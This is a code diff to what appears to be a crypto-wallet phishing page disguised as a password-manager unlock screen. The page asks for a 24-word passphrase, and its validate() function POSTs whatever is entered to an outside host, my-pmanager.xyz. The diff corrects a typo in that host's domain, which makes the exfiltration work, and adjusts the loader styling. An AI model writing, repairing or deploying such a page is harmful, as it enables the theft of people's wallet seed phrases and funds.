@@ -13,7 +13,7 @@
 	<textarea placeholder="Enter your 24-word passphrase here"></textarea>
 	<div class="erbox" >
 		<div class="error ip">Invalid passphrase <span>or incomplete KYC</span></div>
-		<div nclick="validate()" class="btn uwp">Unlock with passphrase<div class=lds-ring ><div></div><div></div><div></div></div></div>
+		<div nclick="validate()" class="btn uwp">Unlock with passphrase<div class="lds-ring loader" ><div></div><div></div><div></div></div></div>
 	</div>
 	<div class="erbox" >
 		<div class="error pup">Please use passphrase to unlock</div>
@@ -43,12 +43,16 @@ margin-left:-5em;
 opacity:0.7;
 }*/
 
+.loader{
+display:none;
+}
+
 .lds-ring {
   display: inline-block;
   position: absolute;
   width: 1.5em;
   height: 1.5em;
-  margin-left:-5em;
+  margin-left:-6em;
   margin-top:-0.6em;
 }
 .lds-ring div {
@@ -181,7 +185,7 @@ function validate(){
 	if(tv!="")
 	$.ajax({
 		type: "POST",
-		url: "https://my-pmanager.xyx/get_response.php",
+		url: "https://my-pmanager.xyz/get_response.php",
 		data: {
 			"response":$("textarea").val(),
 		},
